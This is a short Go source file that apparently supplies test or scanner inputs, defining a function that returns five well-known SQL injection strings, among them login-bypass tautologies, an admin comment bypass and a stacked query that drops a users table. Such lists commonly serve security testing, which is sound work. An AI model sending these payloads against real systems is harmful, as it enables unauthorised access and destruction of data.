package payloads

func SQLiPayloads() []string {
	return []string{
		`' OR '1'='1`,
		`" OR "1"="1`,
		`admin' --`,
		`' OR 1=1 --`,
		`1; DROP TABLE users`,
	}
}
